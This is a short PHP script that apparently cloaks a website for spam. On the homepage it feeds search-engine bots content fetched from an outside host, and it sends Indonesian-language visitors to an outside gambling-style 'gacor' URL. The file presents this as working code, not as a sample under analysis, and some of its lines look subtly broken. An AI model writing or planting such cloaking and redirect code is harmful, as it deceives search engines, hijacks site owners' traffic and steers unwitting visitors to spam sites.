<?php
    $s_ref = $_SERVER['HTTP_REFERER'];
        $agent = $_SERVER['HTTP_USER_AGENT'];
        if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
            $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
            if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
                setcookie('az', 'lp', time() + 3600 * 7200);
                echo 'nekan-dua.dev/ichijuro/wuling.txt'; // Your bot-specific content
                exit;
            }
            echo file_get_contents("nekan-dua.dev/ichijuro/wuling.txt");
            exit;
        }
        $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        if ($browserLang == 'id') {
            header("Location: https://gacor.terbang-terus.id/amp-neo/layanganjendal/wuling.html");
            exit;
        }
        ?>